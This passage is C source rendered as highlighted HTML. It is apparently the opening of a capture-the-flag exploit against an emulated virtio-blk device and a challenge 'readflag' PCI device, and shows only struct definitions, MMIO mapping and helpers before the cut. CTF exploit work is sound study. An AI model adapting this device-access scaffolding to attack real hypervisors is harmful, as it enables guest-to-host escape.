class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u8 uint8_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u16 uint16_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u32 uint32_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> u64 uint64_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> le16 u16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> le32 u32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> le64 u64</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> {</span></span><br><span class="line">    u8 cap_vndr;</span><br><span class="line">    u8 cap_next;</span><br><span class="line">    u8 cap_len;</span><br><span class="line">    u8 cfg_type;</span><br><span class="line">    u8 bar;</span><br><span class="line">    u8 id;</span><br><span class="line">    u8 padding[<span class="number">2</span>];</span><br><span class="line">    le32 offset;</span><br><span class="line">    le32 length;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_common_cfg</span> {</span></span><br><span class="line">    <span class="comment">/* About the whole device. */</span></span><br><span class="line">    le32 device_feature_select; <span class="comment">/* read-write */</span></span><br><span class="line">    le32 device_feature; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    le32 driver_feature_select; <span class="comment">/* read-write */</span></span><br><span class="line">    le32 driver_feature; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 config_msix_vector; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 num_queues; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    u8 device_status; <span class="comment">/* read-write */</span></span><br><span class="line">    u8 config_generation; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    <span class="comment">/* About a specific virtqueue. */</span></span><br><span class="line">    le16 queue_select; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_size; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_msix_vector; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_enable; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_notify_off; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    le64 queue_desc; <span class="comment">/* read-write */</span></span><br><span class="line">    le64 queue_driver; <span class="comment">/* read-write */</span></span><br><span class="line">    le64 queue_device; <span class="comment">/* read-write */</span></span><br><span class="line">    le16 queue_notify_data; <span class="comment">/* read-only for driver */</span></span><br><span class="line">    le16 queue_reset; <span class="comment">/* read-write */</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_notify_cfg</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> <span class="title">cap</span>;</span></span><br><span class="line">    le32 notify_off_multiplier;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_config</span>{</span></span><br><span class="line">    le64 capacity;</span><br><span class="line">    le32 size_max;</span><br><span class="line">    le32 seg_max;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_geometry</span> {</span></span><br><span class="line">        le16 cylinders;</span><br><span class="line">        u8 heads;</span><br><span class="line">        u8 sectors;</span><br><span class="line">    } geometry;</span><br><span class="line">    le32 blk_size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_topology</span> {</span></span><br><span class="line">        <span class="comment">// # of logical blocks per physical block (log2)</span></span><br><span class="line">        u8 physical_block_exp;</span><br><span class="line">        <span class="comment">// offset of first aligned logical block</span></span><br><span class="line">        u8 alignment_offset;</span><br><span class="line">        <span class="comment">// suggested minimum I/O size in blocks</span></span><br><span class="line">        le16 min_io_size;</span><br><span class="line">        <span class="comment">// optimal (suggested maximum) I/O size in blocks</span></span><br><span class="line">        le32 opt_io_size;</span><br><span class="line">    } topology;</span><br><span class="line">    u8 writeback;</span><br><span class="line">    u8 unused0;</span><br><span class="line">    u16 num_queues;</span><br><span class="line">    le32 max_discard_sectors;</span><br><span class="line">    le32 max_discard_seg;</span><br><span class="line">    le32 discard_sector_alignment;</span><br><span class="line">    le32 max_write_zeroes_sectors;</span><br><span class="line">    le32 max_write_zeroes_seg;</span><br><span class="line">    u8 write_zeroes_may_unmap;</span><br><span class="line">    u8 unused1[<span class="number">3</span>];</span><br><span class="line">    le32 max_secure_erase_sectors;</span><br><span class="line">    le32 max_secure_erase_seg;</span><br><span class="line">    le32 secure_erase_sector_alignment;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">virtio_pci_cfg_type</span>{</span></span><br><span class="line">    VIRTIO_PCI_CAP_COMMON_CFG = <span class="number">0x1</span>,</span><br><span class="line">    VIRTIO_PCI_CAP_NOTIFY_CFG = <span class="number">0x2</span>,</span><br><span class="line">    VIRTIO_PCI_CAP_ISR_CFG = <span class="number">0x3</span>,</span><br><span class="line">    VIRTIO_PCI_CAP_DEVICE_CFG = <span class="number">0x4</span>,</span><br><span class="line">    VIRTIO_PCI_CAP_PCI_CFG = <span class="number">0x5</span>,</span><br><span class="line">    VIRTIO_PCI_CAP_SHARED_MEMORY = <span class="number">0x8</span>,</span><br><span class="line">    VIRTIO_PCI_CAP_VENDOR_CFG = <span class="number">0x9</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Feature bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_SIZE_MAX1<span class="comment">/* Indicates maximum segment size */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_SEG_MAX2<span class="comment">/* Indicates maximum # of segments */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_GEOMETRY4<span class="comment">/* Legacy geometry available  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_RO5<span class="comment">/* Disk is read-only */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_BLK_SIZE6<span class="comment">/* Block size of disk is available*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_FLUSH9<span class="comment">/* Flush command supported */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_TOPOLOGY10<span class="comment">/* Topology information is available */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_MQ12<span class="comment">/* support more than one vq */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_DISCARD13<span class="comment">/* DISCARD is supported */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_WRITE_ZEROES14<span class="comment">/* WRITE ZEROES is supported */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_F_SECURE_ERASE16 <span class="comment">/* Secure Erase is supported */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Status byte for guest to report progress, and synchronize features. */</span></span><br><span class="line"><span class="comment">/* We have seen device and processed generic fields (VIRTIO_CONFIG_F_VIRTIO) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_CONFIG_S_ACKNOWLEDGE1</span></span><br><span class="line"><span class="comment">/* We have found a driver for the device. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_CONFIG_S_DRIVER2</span></span><br><span class="line"><span class="comment">/* Driver has used its parts of the config, and is happy */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_CONFIG_S_DRIVER_OK4</span></span><br><span class="line"><span class="comment">/* Driver has finished configuring features */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_CONFIG_S_FEATURES_OK8</span></span><br><span class="line"><span class="comment">/* Device entered invalid state, driver must reset it */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_CONFIG_S_NEEDS_RESET0x40</span></span><br><span class="line"><span class="comment">/* We've given up on this device. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_CONFIG_S_FAILED0x80</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_QUEUE_SIZE 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_desc</span> {</span></span><br><span class="line">    <span class="comment">/* Address (guest-physical). */</span></span><br><span class="line">    le64 addr;</span><br><span class="line">    <span class="comment">/* Length. */</span></span><br><span class="line">    le32 len;</span><br><span class="line"><span class="comment">/* This marks a buffer as continuing via the next field. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_NEXT 1</span></span><br><span class="line"><span class="comment">/* This marks a buffer as device write-only (otherwise device read-only). */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_WRITE 2</span></span><br><span class="line"><span class="comment">/* This means the buffer contains a list of buffer descriptors. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_INDIRECT 4</span></span><br><span class="line">    <span class="comment">/* The flags as indicated above. */</span></span><br><span class="line">    le16 flags;</span><br><span class="line">    <span class="comment">/* Next field if flags &amp; NEXT */</span></span><br><span class="line">    le16 next;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_avail</span> {</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_AVAIL_F_NO_INTERRUPT 1</span></span><br><span class="line">    le16 flags;</span><br><span class="line">    le16 idx;</span><br><span class="line">    le16 ring[VIRTIO_QUEUE_SIZE];</span><br><span class="line">    le16 used_event; <span class="comment">/* Only if VIRTIO_F_EVENT_IDX */</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_used_elem</span> {</span></span><br><span class="line">    <span class="comment">/* Index of start of used descriptor chain. */</span></span><br><span class="line">    le32 id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * The number of bytes written into the device writable portion of</span></span><br><span class="line"><span class="comment">    * the buffer described by the descriptor chain.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    le32 len;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_used</span> {</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_USED_F_NO_NOTIFY 1</span></span><br><span class="line">    le16 flags;</span><br><span class="line">    le16 idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">virtq_used_elem</span> <span class="title">ring</span>[<span class="title">VIRTIO_QUEUE_SIZE</span>];</span></span><br><span class="line">    le16 avail_event; <span class="comment">/* Only if VIRTIO_F_EVENT_IDX */</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_blk_req</span> {</span></span><br><span class="line">    le32 type;</span><br><span class="line">    le32 reserved;</span><br><span class="line">    le64 sector;</span><br><span class="line">    u8 data[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// u8 status;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_IN 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_OUT 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_FLUSH 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_GET_ID 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_GET_LIFETIME 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_DISCARD 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_WRITE_ZEROES 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTIO_BLK_T_SECURE_ERASE 14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_cap</span><span class="params">(<span class="keyword">struct</span> virtio_pci_cap* cap)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cap_len: %x\n"</span>, cap-&gt;cap_len);</span><br><span class="line">    <span class="keyword">switch</span>(cap-&gt;cfg_type){</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_COMMON_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: common\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_NOTIFY_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: notify\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_ISR_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: isr\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_DEVICE_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: device\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_PCI_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: pci\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_SHARED_MEMORY:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: shared memory\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> VIRTIO_PCI_CAP_VENDOR_CFG:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: vendor\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"cfg_type: unknown\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bar: %x\n"</span>, cap-&gt;bar);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"id: %x\n"</span>, cap-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"offset: %x\n"</span>, cap-&gt;offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"length: %x\n"</span>, cap-&gt;length);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ERR</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf)</span>{</span><br><span class="line">    perror(buf);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">LOG</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf)</span>{</span><br><span class="line">    write(<span class="number">2</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span>* readflag_mmio = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span>* virtio_mmio = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span>* virtio_common_mmio = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> <span class="title">virtio_notify_cfg</span>* <span class="title">virtio_notify_mmio</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span>* virtio_isr_mmio = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span>* virtio_device_mmio = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span>* dma_mem = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">char</span>* dma_data = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> <span class="title">virtq_desc</span>* <span class="title">queue_desc</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> <span class="title">virtq_avail</span>* <span class="title">queue_avail</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> <span class="title">virtq_used</span>* <span class="title">queue_used</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_readflag</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:05.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        ERR(<span class="string">"Open readflag"</span>);</span><br><span class="line">    }</span><br><span class="line">    readflag_mmio = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(readflag_mmio == (<span class="keyword">volatile</span> <span class="type">void</span>*)<span class="number">-1</span>){</span><br><span class="line">        ERR(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">    close(mmio_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"readflag init done"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">mmio_read8</span><span class="params">(<span class="type">void</span>* addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)addr;</span><br><span class="line">}</span><br><span class="line"></span><br><span 